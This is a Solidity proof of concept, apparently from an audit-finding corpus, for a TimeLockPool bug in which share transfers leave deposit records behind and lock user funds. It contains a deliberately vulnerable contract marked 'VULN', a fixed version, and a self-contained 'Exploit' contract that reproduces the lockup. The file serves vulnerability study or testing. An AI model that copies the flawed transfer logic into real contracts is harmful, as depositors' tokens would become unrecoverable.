// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 56297 — Rainmaker TimeLockPool (Zokyo, 2021-12).
 *
 * deposit() records a Deposit in depositsOf[receiver] and mints share tokens.
 * ERC20 transfer moves the shares and does not rewrite depositsOf.
 * After maturity:
 *   - the original depositor still has the Deposit but no shares, so withdraw's
 *     share burn reverts and the deposit tokens stay in the pool;
 *   - the share recipient has an empty depositsOf array, so withdraw reverts
 *     "Deposit does not exist".
 * If the recipient is a contract with no share-transfer function, the deposit
 * cannot be moved back. Both the tokens and the shares are stuck.
 *
 * Duration 0 makes the deposit mature in this same block (end == timestamp),
 * so the failure is the missing deposit migration, not a time skip.
 * No cheatcodes. No warp inside run().
 */

contract DepositToken {
    string public constant name = "DEPOSIT";
    string public constant symbol = "DEP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract TimeLockPool {
    struct Deposit {
        uint256 amount;
        uint256 shareAmount;
        uint64 start;
        uint64 end;
    }

    DepositToken public depositToken;
    mapping(address => Deposit[]) public depositsOf;
    mapping(address => uint256) public shareBalance;
    uint256 public totalShares;

    uint256 public depositsOpened;
    uint256 public sharesMinted;
    uint256 public transfers;
    uint256 public depositsLeftOnSender;
    uint256 public withdrawAttempts;

    constructor(DepositToken _token) {
        depositToken = _token;
    }

    function deposit(uint256 _amount, uint256 _duration, address _receiver) external {
        depositsOpened += 1;
        depositToken.transferFrom(msg.sender, address(this), _amount);
        uint256 mintAmount = _amount;
        sharesMinted = mintAmount;
        depositsOf[_receiver].push(
            Deposit({
                amount: _amount,
                shareAmount: mintAmount,
                start: uint64(block.timestamp),
                end: uint64(block.timestamp) + uint64(_duration)
            })
        );
        shareBalance[_receiver] += mintAmount;
        totalShares += mintAmount;
    }

    /// Share transfer. depositsOf is NOT rewritten for either side.
    function transfer(address to, uint256 amount) external returns (bool) {
        require(shareBalance[msg.sender] >= amount, "shares");
        // @> VULN:
        shareBalance[msg.sender] -= amount;
        shareBalance[to] += amount;
        transfers += 1;
        depositsLeftOnSender = depositsOf[msg.sender].length;
        return true;
    }

    function withdraw(uint256 _depositId, address _receiver) external {
        withdrawAttempts += 1;
        require(_depositId < depositsOf[msg.sender].length, "TimeLockPool.withdraw: Deposit does not exist");
        Deposit memory userDeposit = depositsOf[msg.sender][_depositId];
        require(block.timestamp >= userDeposit.end, "TimeLockPool.withdraw: too soon");
        uint256 last = depositsOf[msg.sender].length - 1;
        depositsOf[msg.sender][_depositId] = depositsOf[msg.sender][last];
        depositsOf[msg.sender].pop();
        require(shareBalance[msg.sender] >= userDeposit.shareAmount, "shares");
        shareBalance[msg.sender] -= userDeposit.shareAmount;
        totalShares -= userDeposit.shareAmount;
        depositToken.transfer(_receiver, userDeposit.amount);
    }
}

contract TimeLockPoolFixed {
    struct Deposit {
        uint256 amount;
        uint256 shareAmount;
        uint64 start;
        uint64 end;
    }

    DepositToken public depositToken;
    mapping(address => Deposit[]) public depositsOf;
    mapping(address => uint256) public shareBalance;

    constructor(DepositToken _token) {
        depositToken = _token;
    }

    function deposit(uint256 _amount, uint256 _duration, address _receiver) external {
        depositToken.transferFrom(msg.sender, address(this), _amount);
        depositsOf[_receiver].push(
            Deposit({
                amount: _amount,
                shareAmount: _amount,
                start: uint64(block.timestamp),
                end: uint64(block.timestamp) + uint64(_duration)
            })
        );
        shareBalance[_receiver] += _amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(shareBalance[msg.sender] >= amount, "shares");
        shareBalance[msg.sender] -= amount;
        shareBalance[to] += amount;
        uint256 n = depositsOf[msg.sender].length;
        for (uint256 i = 0; i < n; i++) {
            depositsOf[to].push(depositsOf[msg.sender][i]);
        }
        delete depositsOf[msg.sender];
        return true;
    }

    function withdraw(uint256 _depositId, address _receiver) external {
        require(_depositId < depositsOf[msg.sender].length, "TimeLockPool.withdraw: Deposit does not exist");
        Deposit memory userDeposit = depositsOf[msg.sender][_depositId];
        require(block.timestamp >= userDeposit.end, "TimeLockPool.withdraw: too soon");
        uint256 last = depositsOf[msg.sender].length - 1;
        depositsOf[msg.sender][_depositId] = depositsOf[msg.sender][last];
        depositsOf[msg.sender].pop();
        require(shareBalance[msg.sender] >= userDeposit.shareAmount, "shares");
        shareBalance[msg.sender] -= userDeposit.shareAmount;
        depositToken.transfer(_receiver, userDeposit.amount);
    }
}

contract Depositor {
    function approveAndDeposit(TimeLockPool pool, DepositToken token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.deposit(amount, 0, address(this));
    }

    function approveAndDepositFixed(TimeLockPoolFixed pool, DepositToken token, uint256 amount) external {
        token.approve(address(pool), amount);
        pool.deposit(amount, 0, address(this));
    }

    function xfer(TimeLockPool pool, address to, uint256 amount) external {
        pool.transfer(to, amount);
    }

    function xferFixed(TimeLockPoolFixed pool, address to, uint256 amount) external {
        pool.transfer(to, amount);
    }

    function tryWithdraw(TimeLockPool pool) external returns (bool ok) {
        (ok,) = address(pool).call(abi.encodeWithSelector(pool.withdraw.selector, uint256(0), address(this)));
    }
}

/// Recipient with no share-transfer function. It can only attempt withdraw.
contract ShareSink {
    function tryWithdraw(TimeLockPool pool) external returns (bool ok) {
        (ok,) = address(pool).call(abi.encodeWithSelector(pool.withdraw.selector, uint256(0), address(this)));
    }

    function tryWithdrawFixed(TimeLockPoolFixed pool) external returns (bool ok) {
        (ok,) = address(pool).call(abi.encodeWithSelector(pool.withdraw.selector, uint256(0), address(this)));
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1_000 ether;

    DepositToken public token;
    TimeLockPool public pool;
    Depositor public user1;
    ShareSink public user2;

    bool public user1Withdrew;
    bool public user2Withdrew;
    uint256 public stuck;
    uint256 public user2Shares;
    uint256 public user1Deposits;

    function run() external {
        token = new DepositToken();
        pool = new TimeLockPool(token);
        user1 = new Depositor();
        user2 = new ShareSink();

        token.mint(address(user1), AMOUNT);
        user1.approveAndDeposit(pool, token, AMOUNT);
        user1.xfer(pool, address(user2), AMOUNT);

        user1Withdrew = user1.tryWithdraw(pool);
        user2Withdrew = user2.tryWithdraw(pool);

        stuck = token.balanceOf(address(pool));
        user2Shares = pool.shareBalance(address(user2));
        user1Deposits = pool.depositsLeftOnSender();

        require(!user1Withdrew, "user1");
        require(!user2Withdrew, "user2");
        require(stuck == AMOUNT, "stuck");
        require(user2Shares == AMOUNT, "shares on sink");
        require(user1Deposits == 1, "deposits stayed");
    }
}
